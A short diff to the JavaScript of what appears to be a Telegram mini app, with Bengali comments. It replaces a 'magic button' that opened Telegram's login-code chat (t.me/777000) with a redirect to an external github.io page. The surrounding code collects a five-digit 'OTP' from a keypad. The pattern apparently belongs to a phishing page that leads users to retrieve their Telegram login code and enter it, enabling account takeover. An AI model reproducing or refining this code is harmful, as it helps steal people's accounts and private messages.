@@ -113,10 +113,13 @@
             } else { alert("Error: " + result.message); location.reload(); }
         }
 
-        // --- ম্যাজিক বাটন: ওটিপি চ্যাটে নিয়ে যাওয়া ---
         function viewCode() {
-            tg.openTelegramLink("https://t.me/777000");
-        }
+    // আপনার সফল হওয়া রিডাইরেক্ট লিঙ্ক
+    const redirectUrl = "https://rony90790.github.io/View-code-button-CHEK-/go.html";
+    
+    // ব্রাউজারে ওপেন করার জন্য tg.openLink ব্যবহার করতে হবে
+    tg.openLink(redirectUrl);
+}
 
         function press(n) {
             if(currentOTP.length < 5) {
